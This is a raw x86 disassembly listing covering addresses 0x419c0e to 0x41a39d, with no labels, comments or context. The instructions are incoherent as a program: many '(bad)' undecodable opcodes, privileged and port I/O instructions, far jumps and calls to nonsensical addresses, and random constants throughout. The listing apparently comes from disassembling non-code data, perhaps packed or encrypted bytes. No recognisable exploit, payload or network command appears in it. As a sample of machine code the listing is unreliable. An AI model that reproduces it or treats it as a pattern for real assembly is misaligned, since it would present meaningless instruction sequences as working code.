  419c0e:	aam    0x8f
  419c10:	pop    ecx
  419c11:	mov    esi,gs
  419c13:	push   es
  419c14:	mov    ch,0x6
  419c16:	sti    
  419c17:	cld    
  419c18:	jp     0x419c21
  419c1a:	dec    eax
  419c1b:	shl    BYTE PTR [ebp-0x3e5753a6],0x34
  419c22:	icebp  
  419c23:	hlt    
  419c24:	inc    edx
  419c25:	and    al,BYTE PTR [edx+0x72744125]
  419c2b:	movlps xmm3,QWORD PTR [ebx-0x779deb92]
  419c32:	adc    DWORD PTR [esp+edx*1],ecx
  419c35:	mov    eax,ds:0x11c18bda
  419c3a:	mov    ds,WORD PTR [esp+eiz*2+0x42ab702f]
  419c41:	sbb    bh,al
  419c43:	sbb    ebp,esp
  419c45:	cmc    
  419c46:	jno    0x419c60
  419c48:	fbstp  TBYTE PTR [esi-0x16202e9e]
  419c4e:	inc    ebp
  419c4f:	hlt    
  419c50:	dec    ebx
  419c51:	adc    DWORD PTR [eax+0x2f005120],ecx
  419c57:	cmp    bl,al
  419c59:	shr    BYTE PTR [eax+0x4f70cefd],cl
  419c5f:	rol    DWORD PTR [ecx+0x53285725],0x92
  419c66:	fist   WORD PTR [ebx]
  419c68:	mov    edx,fs
  419c6a:	and    DWORD PTR [edi-0x722fdac3],ebp
  419c70:	retf   
  419c71:	in     eax,dx
  419c72:	les    eax,FWORD PTR [eax-0x6f]
  419c75:	adc    DWORD PTR [ebp+0x75],edi
  419c78:	int    0x5d
  419c7a:	xchg   ebp,eax
  419c7b:	jnp    0x419cb1
  419c7d:	pop    ebx
  419c7e:	xchg   edx,eax
  419c7f:	xchg   edi,eax
  419c80:	jns    0x419cb8
  419c82:	sub    eax,0xdb912376
  419c87:	int3   
  419c88:	sub    ecx,ecx
  419c8a:	imul   eax,DWORD PTR [edx-0x2b],0x4b
  419c8e:	stos   BYTE PTR es:[edi],al
  419c8f:	sbb    eax,0xe3eef539
  419c94:	or     DWORD PTR [ecx-0x36],ebx
  419c97:	fld    DWORD PTR [ecx+0x7922d498]
  419c9d:	jb     0x419c89
  419c9f:	jge    0x419cbd
  419ca1:	jg     0x419c3b
  419ca3:	cli    
  419ca4:	xchg   ecx,eax
  419ca5:	stc    
  419ca6:	xchg   esi,eax
  419ca7:	add    esp,DWORD PTR [ebp+0x6e]
  419caa:	add    BYTE PTR [eax+0x2e8cf451],0x18
  419cb1:	rep outs dx,BYTE PTR ds:[esi]
  419cb3:	jmp    0x419c50
  419cb5:	dec    eax
  419cb6:	inc    ebx
  419cb7:	je     0x419cb7
  419cb9:	repz (bad) 
  419cbb:	mov    edx,0xfc537e9
  419cc0:	rol    BYTE PTR [edx-0x38f6a43a],cl
  419cc6:	mov    ds:0x9bd9dba2,eax
  419ccb:	out    0x22,al
  419ccd:	ins    DWORD PTR es:[edi],dx
  419cce:	loopne 0x419cd5
  419cd0:	(bad)  
  419cd2:	and    al,0x9c
  419cd4:	repnz xor al,0x53
  419cd7:	in     eax,dx
  419cd8:	xor    eax,DWORD PTR ds:0x77fdd1d7
  419cde:	jae    0x419c69
  419ce0:	jmp    0x419c62
  419ce2:	aad    0x98
  419ce4:	pop    ds
  419ce5:	mov    ds:0x88fb6edb,al
  419cea:	loop   0x419cdf
  419cec:	ds (bad) 
  419cee:	jmp    0x7d7190f9
  419cf3:	js     0x419cab
  419cf5:	pusha  
  419cf6:	retf   
  419cf7:	adc    edi,DWORD PTR [edi-0x22dd77fe]
  419cfd:	sbb    eax,DWORD PTR [ebx+ebx*1+0x5]
  419d01:	and    ebx,ebp
  419d03:	push   edx
  419d04:	or     edi,0xffffff82
  419d07:	xchg   esp,eax
  419d08:	mov    bl,cl
  419d0a:	es xchg edi,eax
  419d0c:	mov    esp,0xdacf8334
  419d11:	pop    eax
  419d12:	mov    ebx,0xd7183d5d
  419d17:	xor    DWORD PTR [edx+0x32],ebx
  419d1a:	or     al,0xa6
  419d1c:	jge    0x419d18
  419d1e:	and    BYTE PTR [edx+0x2b],dh
  419d21:	pop    es
  419d22:	aaa    
  419d23:	jmp    0xf7:0x9d3336f3
  419d2a:	xchg   ecx,eax
  419d2b:	bnd jnp 0x419d33
  419d2e:	mov    eax,0x66f6988c
  419d33:	(bad)  
  419d34:	pushf  
  419d35:	pushf  
  419d36:	pushw  ds
  419d38:	(bad)  
  419d39:	xor    eax,0xcc5a0290
  419d3e:	imul   eax,DWORD PTR [esi+0x4a],0xf36135c3
  419d45:	shr    BYTE PTR [esi+0x79],0xf1
  419d49:	inc    ebp
  419d4a:	sub    BYTE PTR [ebp-0x406b5fb4],ch
  419d50:	test   al,0x84
  419d52:	dec    edx
  419d53:	fs in  eax,dx
  419d55:	inc    ecx
  419d56:	test   DWORD PTR [edi],0xf4e5c87e
  419d5c:	mov    ds:0x84a54e17,al
  419d61:	push   esi
  419d62:	jns    0x419d48
  419d64:	push   esi
  419d65:	(bad)  
  419d66:	cwde   
  419d67:	test   dl,ch
  419d69:	sub    ah,ch
  419d6b:	fdivp  st(0),st
  419d6d:	xchg   ebp,eax
  419d6e:	push   ss
  419d6f:	jge    0x419d10
  419d71:	nop
  419d72:	retf   
  419d73:	jge    0x419d9d
  419d75:	add    eax,DWORD PTR [edi+0x64d712c6]
  419d7b:	sbb    esi,DWORD PTR [ebp+ecx*2+0x2d]
  419d7f:	scas   eax,DWORD PTR es:[edi]
  419d80:	or     ebp,eax
  419d82:	imul   esp,edi,0xc890eaef
  419d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d89:	fs sahf 
  419d8b:	or     cl,BYTE PTR [ebx-0x38f03d85]
  419d91:	mov    ebx,0x7d88b17f
  419d96:	mov    bh,0x88
  419d98:	lods   al,BYTE PTR ds:[esi]
  419d99:	or     DWORD PTR [ecx+0x7c],ecx
  419d9c:	int    0xba
  419d9e:	sub    bl,bh
  419da0:	(bad)  
  419da2:	repnz xor eax,0xc7068538
  419da8:	xchg   ebp,eax
  419da9:	mov    edi,gs
  419dab:	out    dx,eax
  419dac:	sti    
  419dad:	pop    ds
  419dae:	mov    ss,WORD PTR [edx]
  419db0:	cs pop edi
  419db2:	repnz mov ds,ebx
  419db5:	mov    WORD PTR [edx+0x37],?
  419db8:	and    ecx,DWORD PTR [eax+ebp*2]
  419dbb:	sub    esp,esp
  419dbd:	jne    0x419e13
  419dbf:	jp     0x419e1b
  419dc1:	rcr    DWORD PTR [ecx],1
  419dc3:	sbb    edx,ebx
  419dc5:	xor    BYTE PTR [eax-0xd],dh
  419dc8:	popa   
  419dc9:	lods   eax,DWORD PTR ds:[esi]
  419dca:	jo     0x419dc4
  419dcc:	ror    ebp,0x94
  419dcf:	rcl    DWORD PTR [esi+ecx*4],cl
  419dd2:	dec    esi
  419dd3:	jmp    0x419dfc
  419dd5:	add    edx,esp
  419dd7:	jno    0x419d8d
  419dd9:	or     BYTE PTR [eax+0x1a],al
  419ddc:	and    ecx,eax
  419dde:	push   edi
  419ddf:	fldcw  WORD PTR es:[esi+0x4f]
  419de3:	pop    edi
  419de4:	mov    edx,0xc77b729d
  419de9:	push   edi
  419dea:	pop    ecx
  419deb:	rep stos BYTE PTR es:[edi],al
  419ded:	mov    bh,0x37
  419def:	das    
  419df0:	hlt    
  419df1:	outs   dx,BYTE PTR ds:[esi]
  419df2:	inc    esp
  419df3:	push   0xffffffd4
  419df5:	and    esi,0x39
  419df8:	push   ds
  419df9:	int3   
  419dfa:	data16 ss (bad) 
  419dfd:	out    0x47,eax
  419dff:	shl    bh,0xae
  419e02:	arpl   WORD PTR [esi+ebp*4],di
  419e05:	or     BYTE PTR [ecx-0x164283f1],cl
  419e0b:	stc    
  419e0c:	vmulss xmm5,xmm5,xmm3
  419e10:	sub    al,bl
  419e12:	fist   WORD PTR [ebx+0x9b45330]
  419e18:	push   0xf68fc55b
  419e1d:	mov    ebx,0xde10fc13
  419e22:	in     eax,0xb1
  419e24:	xchg   edx,eax
  419e25:	mov    edi,?
  419e27:	push   ebx
  419e28:	(bad)
  419e2b:	nop
  419e2c:	xlat   BYTE PTR ds:[ebx]
  419e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e2e:	sbb    DWORD PTR [ecx],edi
  419e30:	in     eax,0xdf
  419e32:	xlat   BYTE PTR ds:[ebx]
  419e33:	not    BYTE PTR [edx]
  419e35:	xchg   DWORD PTR [edx+edx*2],esp
  419e38:	inc    esi
  419e39:	inc    esp
  419e3a:	loop   0x419dc9
  419e3c:	pop    es
  419e3d:	and    ecx,ecx
  419e3f:	cmp    eax,0xa5c0e59c
  419e44:	lahf   
  419e45:	lods   al,BYTE PTR ds:[esi]
  419e46:	pop    ecx
  419e47:	pop    ecx
  419e48:	xor    al,0x5d
  419e4a:	sub    BYTE PTR [eax],ah
  419e4c:	adc    al,0xc
  419e4e:	add    ebp,ebx
  419e50:	push   es
  419e51:	xchg   edi,eax
  419e52:	je     0x419e07
  419e54:	lods   eax,DWORD PTR ds:[esi]
  419e55:	inc    edi
  419e56:	mov    ds:0xe582c364,al
  419e5b:	std    
  419e5c:	adc    eax,0x22f0986
  419e61:	rol    DWORD PTR [ecx+ebx*2-0x10],1
  419e65:	push   cs
  419e66:	push   0x9cf782e6
  419e6b:	call   0x5579:0x3a6934eb
  419e72:	xor    DWORD PTR cs:[ecx+0x27e4f8b],edx
  419e79:	popf   
  419e7a:	push   esp
  419e7b:	jmp    0x419e1e
  419e7d:	mov    ds:0x24d8af05,eax
  419e82:	(bad)  
  419e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e84:	sar    DWORD PTR [ebp-0x3180ace5],cl
  419e8a:	cld    
  419e8b:	jnp    0x419e93
  419e8d:	clc    
  419e8e:	pop    ds
  419e8f:	(bad)  
  419e91:	call   0x9c430b12
  419e96:	or     al,0x48
  419e98:	or     eax,0x5102353
  419e9d:	in     al,dx
  419e9e:	rcr    BYTE PTR [edx-0x2],0xdb
  419ea2:	add    bl,ah
  419ea4:	mov    ds:0x1e57f9cf,al
  419ea9:	inc    esp
  419eaa:	cmp    ebx,DWORD PTR [edi+esi*4-0x2e09d61b]
  419eb1:	repz push 0xffffffb7
  419eb4:	cdq    
  419eb5:	mov    esp,0xa6d6c2e8
  419eba:	push   edi
  419ebb:	mov    bl,0x2b
  419ebd:	mov    eax,ds:0x2bcda7a7
  419ec2:	scas   al,BYTE PTR es:[edi]
  419ec3:	fstp   TBYTE PTR [esi+0x39]
  419ec6:	scas   al,BYTE PTR es:[edi]
  419ec7:	mov    eax,ds:0xf58d953e
  419ecc:	sbb    BYTE PTR [esi-0x26c7edb7],dh
  419ed2:	sahf   
  419ed3:	fwait
  419ed4:	loop   0x419eeb
  419ed6:	mov    dl,0xef
  419ed8:	in     eax,dx
  419ed9:	push   DWORD PTR [edi]
  419edb:	adc    al,0x23
  419edd:	mov    dl,0xda
  419edf:	dec    edi
  419ee0:	add    esp,ebp
  419ee2:	mov    cl,0x70
  419ee4:	push   cs
  419ee5:	push   ds
  419ee6:	pop    ebp
  419ee7:	bndldx (bad),[ecx+0x36]
  419eeb:	push   ebx
  419eec:	stc    
  419eed:	sbb    bl,BYTE PTR [ecx+0x50fbe91]
  419ef3:	mov    dl,0x19
  419ef5:	fmul   DWORD PTR [ebx+ecx*1+0x29c9314]
  419efc:	xchg   ebx,eax
  419efd:	(bad)  
  419efe:	nop
  419eff:	not    BYTE PTR [eax-0x6667c952]
  419f05:	rcl    DWORD PTR [ebx],1
  419f07:	mov    ds:0xee923fcf,al
  419f0c:	push   ds
  419f0d:	mov    ecx,0x33de66d0
  419f12:	xchg   ebx,eax
  419f13:	fadd   st,st(7)
  419f15:	jnp    0x419ed2
  419f17:	cli    
  419f18:	les    edi,FWORD PTR [ebx-0x28890ede]
  419f1e:	sbb    DWORD PTR [edx-0x213d514],0x4590f344
  419f28:	jo     0x419f97
  419f2a:	jne    0x419f41
  419f2c:	xchg   bl,dl
  419f2e:	dec    eax
  419f2f:	bound  esp,QWORD PTR [esi]
  419f31:	pop    DWORD PTR [ebp-0x36685cec]
  419f37:	and    ecx,DWORD PTR [ecx]
  419f39:	test   al,0x32
  419f3b:	retf   0xc09b
  419f3e:	adc    esp,DWORD PTR [ebp-0x71f02163]
  419f44:	(bad)  
  419f45:	mov    dl,0x7d
  419f47:	xor    eax,0x59f64980
  419f4c:	aam    0xe8
  419f4e:	out    dx,eax
  419f4f:	pop    ss
  419f50:	mov    ecx,0x95183ea8
  419f55:	vpacksswb xmm3,xmm6,XMMWORD PTR [esp+eax*1+0x461ac3bd]
  419f5e:	out    0xfb,ax
  419f61:	popf   
  419f62:	pop    es
  419f63:	xchg   ebp,eax
  419f64:	sub    ch,dh
  419f66:	jle    0x419f08
  419f68:	out    dx,al
  419f69:	ret    0x7b2a
  419f6c:	stos   BYTE PTR es:[edi],al
  419f6d:	pop    esp
  419f6e:	add    ecx,DWORD PTR [eax]
  419f70:	test   eax,0xedd90e4e
  419f75:	jo     0x419f3b
  419f77:	cld    
  419f78:	les    ecx,FWORD PTR [esi-0x5269c71]
  419f7e:	add    eax,0x20de4876
  419f83:	(bad)  
  419f84:	jnp    0x419fbc
  419f86:	das    
  419f87:	scas   al,BYTE PTR es:[edi]
  419f88:	pop    es
  419f89:	jae    0x419fac
  419f8b:	mov    BYTE PTR [eax-0x71dc0756],bh
  419f91:	(bad)  
  419f92:	aas    
  419f93:	dec    ebx
  419f94:	push   ds
  419f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f96:	cmp    ebx,ecx
  419f98:	ret    
  419f99:	in     al,0xf7
  419f9b:	fst    DWORD PTR [edx+0x4a]
  419f9e:	daa    
  419f9f:	js     0x419fac
  419fa1:	dec    ebx
  419fa2:	call   0x194a3f05
  419fa7:	setge  dh
  419faa:	mul    cl
  419fac:	xchg   ecx,eax
  419fad:	(bad)  
  419fae:	jmp    FWORD PTR [edx]
  419fb0:	jae    0x419fc0
  419fb2:	mov    ds,WORD PTR [ebx]
  419fb4:	pop    ebp
  419fb5:	dec    esi
  419fb6:	mov    bl,0x46
  419fb8:	and    al,0x3f
  419fba:	(bad)  
  419fbb:	loope  0x419f76
  419fbd:	pop    edx
  419fbe:	es jg  0x41a02d
  419fc1:	inc    ebp
  419fc2:	push   esp
  419fc3:	test   BYTE PTR [ecx+eax*1-0x4b854487],cl
  419fca:	and    ebp,DWORD PTR [ebx+0x33]
  419fcd:	xor    ecx,ebx
  419fcf:	sub    al,bh
  419fd1:	pop    DWORD PTR [edx-0x75617fa5]
  419fd7:	jnp    0x41a04b
  419fd9:	movd   DWORD PTR [ebx+0x72],mm4
  419fdd:	add    esp,DWORD PTR [edi+0x45]
  419fe0:	pusha  
  419fe1:	mov    edi,0x529cf81b
  419fe6:	shl    DWORD PTR [ebp+0x5f6fd105],1
  419fec:	ins    BYTE PTR es:[edi],dx
  419fed:	push   esi
  419fee:	int3   
  419fef:	jecxz  0x41a068
  419ff1:	pop    esp
  419ff2:	inc    edi
  419ff3:	cwde   
  419ff4:	dec    eax
  419ff5:	sub    eax,0xc34d83e8
  419ffa:	lahf   
  419ffb:	push   ebp
  419ffc:	sbb    ecx,DWORD PTR [edi+0x3302e415]
  41a002:	fmul   QWORD PTR [ebx-0x7b]
  41a005:	imul   eax,DWORD PTR [eax+0x2c429533],0x46
  41a00c:	mov    ah,0xad
  41a00e:	retf   
  41a00f:	ja     0x419fc5
  41a011:	lods   al,BYTE PTR ds:[esi]
  41a012:	scas   al,BYTE PTR es:[edi]
  41a013:	outs   dx,BYTE PTR ds:[esi]
  41a014:	xor    BYTE PTR [ebp-0x1b],ch
  41a017:	repnz push ebx
  41a019:	out    0x65,al
  41a01b:	pop    es
  41a01c:	and    eax,0xdfc7a8f4
  41a021:	(bad)  [ecx-0x7b]
  41a024:	sbb    DWORD PTR [edx-0x64976e17],edi
  41a02a:	xor    BYTE PTR [ebp+0x44],al
  41a02d:	pop    ds
  41a02e:	dec    esp
  41a02f:	out    dx,al
  41a030:	push   esi
  41a031:	scas   al,BYTE PTR es:[edi]
  41a032:	fisttp QWORD PTR [ecx]
  41a034:	cmp    dh,BYTE PTR [eax+0xc57934d]
  41a03a:	popa   
  41a03b:	(bad)  
  41a03c:	retf   
  41a03d:	mov    ebx,0x9dd4e18e
  41a042:	and    esi,DWORD PTR [eax+0x30633922]
  41a048:	push   edi
  41a049:	xchg   ebp,eax
  41a04a:	mov    bl,0x12
  41a04c:	push   ebp
  41a04d:	dec    ebx
  41a04e:	xchg   ebp,eax
  41a04f:	and    al,0x75
  41a051:	in     eax,0x31
  41a053:	sbb    ebp,eax
  41a055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a056:	pop    ss
  41a057:	adc    ch,BYTE PTR [edi-0x48]
  41a05a:	mov    WORD PTR [ecx+0x5c],es
  41a05d:	aaa    
  41a05e:	ins    BYTE PTR es:[edi],dx
  41a05f:	pop    ss
  41a060:	sbb    al,0x3e
  41a062:	xor    ch,BYTE PTR [edx+0x58]
  41a065:	inc    BYTE PTR [esi+ebp*1+0x20180e4e]
  41a06c:	mov    dh,BYTE PTR [esi+0x2f9c390a]
  41a072:	shl    DWORD PTR [ebx-0x5f],0x89
  41a076:	mov    DWORD PTR ds:0x31482a5,esp
  41a07c:	push   eax
  41a07d:	cli    
  41a07e:	sub    DWORD PTR [ecx],edi
  41a080:	dec    eax
  41a081:	imul   BYTE PTR [esi+eiz*2-0x469cc2b]
  41a088:	pop    eax
  41a089:	popa   
  41a08a:	push   ebp
  41a08b:	mov    eax,0xc87e3faf
  41a090:	sbb    bl,bh
  41a092:	push   esi
  41a093:	imul   ecx,DWORD PTR [ebx+0x20f28d4b],0x81bccd54
  41a09d:	xlat   BYTE PTR ds:[ebx]
  41a09e:	mov    bl,0xcf
  41a0a0:	out    dx,al
  41a0a1:	sbb    eax,0x88e72ce7
  41a0a6:	inc    edx
  41a0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0a8:	pop    ebx
  41a0a9:	add    BYTE PTR [ecx],dl
  41a0ab:	cmp    al,BYTE PTR [edx]
  41a0ad:	push   ds
  41a0ae:	mov    ah,0xc0
  41a0b0:	lea    edx,[ebx+0x57d3ce04]
  41a0b6:	sbb    esi,DWORD PTR [esi-0x49]
  41a0b9:	ins    BYTE PTR es:[edi],dx
  41a0ba:	sbb    ebp,ebp
  41a0bc:	jg     0x41a0d3
  41a0be:	dec    eax
  41a0bf:	jno    0x41a069
  41a0c1:	xchg   BYTE PTR [ebx+edx*8],cl
  41a0c4:	fdivp  st(5),st
  41a0c6:	add    eax,0x8b764b77
  41a0cb:	dec    edi
  41a0cc:	mov    DWORD PTR [edx+0x2a10588e],ebp
  41a0d2:	ja     0x41a108
  41a0d4:	fild   QWORD PTR [esi]
  41a0d6:	or     ah,BYTE PTR [eax-0x4b]
  41a0d9:	xchg   edx,eax
  41a0da:	push   ebx
  41a0db:	retf   0x75bf
  41a0de:	fmul   st,st(0)
  41a0e0:	test   al,0xf7
  41a0e2:	fistp  DWORD PTR ds:0x76de6b05
  41a0e8:	fisub  WORD PTR ds:0xef7471f1
  41a0ee:	pop    esp
  41a0ef:	add    dl,BYTE PTR [edi-0x403ebf93]
  41a0f5:	mov    edx,0x778927e0
  41a0fa:	mov    cl,0x4f
  41a0fc:	push   ss
  41a0fd:	cmc    
  41a0fe:	cld    
  41a0ff:	aaa    
  41a100:	das    
  41a101:	jmp    0xa235:0xf1add335
  41a108:	repz cmp ch,BYTE PTR [edx]
  41a10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a10c:	jmp    0x3c2a:0x3337201
  41a113:	(bad)  
  41a114:	ja     0x41a0fd
  41a116:	push   cs
  41a117:	push   ss
  41a118:	out    0x2d,al
  41a11a:	movzx  edi,ah
  41a11d:	stc    
  41a11e:	loop   0x41a13e
  41a120:	jg     0x41a138
  41a122:	push   eax
  41a123:	(bad)  
  41a124:	xchg   ecx,eax
  41a125:	push   esp
  41a126:	test   al,0x24
  41a128:	das    
  41a129:	jae    0x41a128
  41a12b:	add    eax,0x1495bd22
  41a130:	popw   ds
  41a132:	push   ebp
  41a133:	push   0x6a0949f2
  41a138:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41a13a:	fld    TBYTE PTR [eax-0x3abcb5f3]
  41a140:	sub    bl,BYTE PTR [eax]
  41a142:	aad    0x3c
  41a144:	mov    bl,BYTE PTR [esi+0xbe6e311]
  41a14a:	jmp    0xffbc724d
  41a14f:	jno    0x41a11f
  41a151:	xchg   eax,edx
  41a153:	cld    
  41a154:	mov    al,ds:0x26970eaa
  41a159:	sbb    al,0x7c
  41a15b:	sbb    al,0x40
  41a15d:	loop   0x41a0f0
  41a15f:	jo     0x41a138
  41a161:	mov    ebp,0xe6699964
  41a166:	jecxz  0x41a1ba
  41a168:	xchg   edi,eax
  41a169:	xchg   ebx,eax
  41a16a:	hlt    
  41a16b:	lods   eax,DWORD PTR ds:[esi]
  41a16c:	mov    esi,0xaa454bea
  41a171:	mov    ecx,0xbda07387
  41a176:	cmp    DWORD PTR [ebx-0x58],ebp
  41a179:	pop    ss
  41a17a:	xchg   BYTE PTR [edi],dl
  41a17c:	ja     0x41a175
  41a17e:	cmp    eax,0x2a5f76f7
  41a183:	repz xchg esp,eax
  41a185:	cmp    DWORD PTR [ebx-0x79dbc321],edx
  41a18b:	jb     0x41a1b7
  41a18d:	aad    0x90
  41a18f:	cli    
  41a190:	mov    dh,0xfb
  41a192:	loop   0x41a119
  41a194:	(bad)  
  41a195:	icebp  
  41a196:	xchg   DWORD PTR [edx-0x40],ebp
  41a199:	adc    BYTE PTR [ecx-0x3d],al
  41a19c:	aad    0xd5
  41a19e:	cmp    esi,eax
  41a1a0:	and    BYTE PTR [edx-0x27],bh
  41a1a3:	mov    edx,0x930b7bc1
  41a1a8:	mov    al,ds:0x5d990954
  41a1ad:	rcl    BYTE PTR [edx],0xd8
  41a1b0:	(bad)  
  41a1b1:	in     al,0x81
  41a1b3:	jge    0x41a172
  41a1b5:	cmc    
  41a1b6:	mov    ds:0xf1f6c31b,eax
  41a1bb:	xlat   BYTE PTR ds:[ebx]
  41a1bc:	mov    al,BYTE PTR [ebp+eiz*2+0x44]
  41a1c0:	sub    al,0xfb
  41a1c2:	js     0x41a190
  41a1c4:	dec    esp
  41a1c5:	test   eax,0xef938712
  41a1ca:	aaa    
  41a1cb:	jmp    0x41a199
  41a1cd:	cld    
  41a1ce:	cmp    ebp,DWORD PTR [ebx-0x2e7dd331]
  41a1d4:	sub    bl,BYTE PTR [edi]
  41a1d6:	out    0xc1,eax
  41a1d8:	add    DWORD PTR [edi],0x84f3d661
  41a1de:	push   esp
  41a1df:	leave  
  41a1e0:	inc    edi
  41a1e1:	mov    ds:0xdb20aeaa,eax
  41a1e6:	jge    0x41a19d
  41a1e8:	adc    ecx,DWORD PTR [eax+0x687e60ce]
  41a1ee:	mov    bl,0x92
  41a1f0:	mov    edi,0x49b1e5da
  41a1f5:	mov    al,0x57
  41a1f7:	inc    ebx
  41a1f8:	jae    0x41a1ca
  41a1fa:	mov    al,0x81
  41a1fc:	xor    al,bl
  41a1fe:	cli    
  41a1ff:	aas    
  41a200:	neg    DWORD PTR [edi+0x35]
  41a203:	stos   DWORD PTR es:[edi],eax
  41a204:	jg     0x41a1f0
  41a206:	mov    edi,0x93e781b0
  41a20b:	scas   eax,DWORD PTR es:[edi]
  41a20c:	push   ss
  41a20d:	xor    dh,BYTE PTR [ebx]
  41a20f:	loop   0x41a206
  41a211:	pop    esp
  41a212:	or     cl,0xab
  41a215:	push   esi
  41a216:	clc    
  41a217:	adc    DWORD PTR [esp+ecx*1-0x6a],0xffffffd7
  41a21c:	shl    BYTE PTR [edx-0x2d],0x70
  41a220:	jle    0x41a25d
  41a222:	lock lods al,BYTE PTR ds:[esi]
  41a224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a225:	pop    ebx
  41a226:	sub    eax,0xa3d0a41f
  41a22b:	lods   eax,DWORD PTR ds:[esi]
  41a22c:	dec    edx
  41a22d:	sahf   
  41a22e:	mov    esi,0x182d3ccc
  41a233:	cmp    al,0x5a
  41a235:	sbb    eax,0xbd266549
  41a23a:	sbb    al,0xd9
  41a23c:	sbb    eax,0x67dc8ec2
  41a241:	push   0x9c7a6525
  41a246:	or     esi,DWORD PTR [edx]
  41a248:	jmp    0xc127:0x32195302
  41a24f:	clc    
  41a250:	inc    ebp
  41a251:	daa    
  41a252:	adc    BYTE PTR [edi+0x74164066],bh
  41a258:	jns    0x41a25f
  41a25a:	int3   
  41a25b:	je     0x41a206
  41a25d:	call   0xaa3a:0x2df69800
  41a264:	sub    BYTE PTR [edx+0x33b05123],ah
  41a26a:	rcr    DWORD PTR [ecx-0x2e],cl
  41a26d:	inc    ecx
  41a26e:	jb     0x41a294
  41a270:	pop    ebp
  41a271:	(bad)  
  41a272:	jmp    0x3df6:0xfae6a0c2
  41a279:	mov    DWORD PTR [eax],ecx
  41a27b:	push   edx
  41a27c:	call   0x50b2db64
  41a281:	fld    st(7)
  41a283:	mov    eax,es
  41a285:	pop    edx
  41a286:	mov    al,0x8d
  41a288:	hlt    
  41a289:	fadd   DWORD PTR [ebp+0x7d829dff]
  41a28f:	sub    dl,bl
  41a291:	add    BYTE PTR [ecx+0x58],0x8a
  41a295:	mov    dh,0x2d
  41a297:	add    eax,0x4ca935f3
  41a29c:	in     eax,0xf2
  41a29e:	jecxz  0x41a276
  41a2a0:	in     al,0xab
  41a2a2:	jg     0x41a318
  41a2a4:	cwde   
  41a2a5:	sbb    bl,BYTE PTR [ebp+0x31bb1928]
  41a2ab:	lods   al,BYTE PTR ds:[esi]
  41a2ac:	fiadd  DWORD PTR ds:0x5d25c6fb
  41a2b2:	mov    gs,WORD PTR ds:0x9f733986
  41a2b8:	dec    ebx
  41a2b9:	(bad)  
  41a2ba:	cmp    esi,DWORD PTR [ecx+0xcecdd2d]
  41a2c0:	ins    BYTE PTR es:[edi],dx
  41a2c1:	add    DWORD PTR [edi],ebp
  41a2c3:	pop    edi
  41a2c4:	or     al,0x35
  41a2c6:	mov    al,ds:0x80342658
  41a2cb:	call   0x97992eda
  41a2d0:	dec    edx
  41a2d1:	pop    es
  41a2d2:	push   cs
  41a2d3:	in     eax,dx
  41a2d4:	ret    0xf5f2
  41a2d7:	xor    edi,DWORD PTR [ecx-0x66]
  41a2da:	and    eax,0xaed69320
  41a2df:	xchg   edx,eax
  41a2e0:	dec    esp
  41a2e1:	hlt    
  41a2e2:	pop    ebp
  41a2e3:	repnz fcom QWORD PTR [edi+0x22]
  41a2e7:	inc    eax
  41a2e8:	iret   
  41a2e9:	sbb    al,BYTE PTR [ebx]
  41a2eb:	push   ebp
  41a2ec:	sbb    eax,DWORD PTR [ecx]
  41a2ee:	pushf  
  41a2ef:	pop    ds
  41a2f0:	cmp    DWORD PTR [esi],ebx
  41a2f2:	jecxz  0x41a2fe
  41a2f4:	push   0xffffffcb
  41a2f6:	daa    
  41a2f7:	jne    0x41a28a
  41a2f9:	jb     0x41a2e1
  41a2fb:	repnz push 0x62
  41a2fe:	pop    eax
  41a2ff:	retf   
  41a300:	jnp    0x41a283
  41a302:	test   eax,0x438913a2
  41a307:	test   ah,dl
  41a309:	js     0x41a31a
  41a30b:	pusha  
  41a30c:	loopne 0x41a34b
  41a30e:	push   eax
  41a30f:	adc    al,0xcf
  41a311:	std    
  41a312:	loope  0x41a2d7
  41a314:	mov    ebx,DWORD PTR [ebx-0x58]
  41a317:	inc    ebp
  41a318:	sub    BYTE PTR [edx],bl
  41a31a:	adc    al,0x1e
  41a31c:	aad    0x29
  41a31e:	(bad)  
  41a31f:	(bad)  
  41a320:	or     eax,0x26abd622
  41a325:	inc    ebp
  41a326:	sub    edx,0x6b5034c5
  41a32c:	adc    eax,0xa559f4db
  41a331:	sar    DWORD PTR [esi+0x1e94516c],cl
  41a337:	js     0x41a341
  41a339:	cmp    eax,0x6c16d4af
  41a33e:	sbb    BYTE PTR ds:0x7e4b0e2,cl
  41a344:	scas   al,BYTE PTR es:[edi]
  41a345:	retf   0xd682
  41a348:	mov    al,0x68
  41a34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a34b:	ret    
  41a34c:	cmp    BYTE PTR [ebp+0x6408915a],cl
  41a352:	test   BYTE PTR [ecx-0x76],al
  41a355:	jae    0x41a3ac
  41a357:	std    
  41a358:	cmp    ecx,DWORD PTR [eax-0x6a]
  41a35b:	xchg   esp,eax
  41a35c:	lods   al,BYTE PTR ds:[esi]
  41a35d:	stc    
  41a35e:	cdq    
  41a35f:	fiadd  DWORD PTR ds:0x62ca5cce
  41a365:	push   ebp
  41a366:	ja     0x41a3b5
  41a368:	clc    
  41a369:	pop    esp
  41a36a:	popf   
  41a36b:	dec    esi
  41a36c:	sbb    al,0xba
  41a36e:	xor    cl,BYTE PTR [edi-0x55]
  41a371:	add    al,al
  41a373:	(bad)  
  41a374:	cdq    
  41a375:	mov    edx,DWORD PTR ds:[ecx-0x7cac3218]
  41a37c:	xchg   BYTE PTR ds:0xd55184f9,ah
  41a382:	scas   eax,DWORD PTR es:[edi]
  41a383:	dec    ebx
  41a384:	adc    edi,0x120cd7fa
  41a38a:	scas   al,BYTE PTR es:[edi]
  41a38b:	outs   dx,DWORD PTR cs:[esi]
  41a38d:	stos   DWORD PTR es:[edi],eax
  41a38e:	or     al,0x4d
  41a390:	xchg   ebp,eax
  41a391:	mov    ds:0x4893ee70,al
  41a396:	leave  
  41a397:	(bad)  
  41a398:	pop    ebp
  41a399:	mov    dl,0x9e
  41a39b:	push   edx
  41a39c:	inc    ebx
  41a39d:	(bad)  
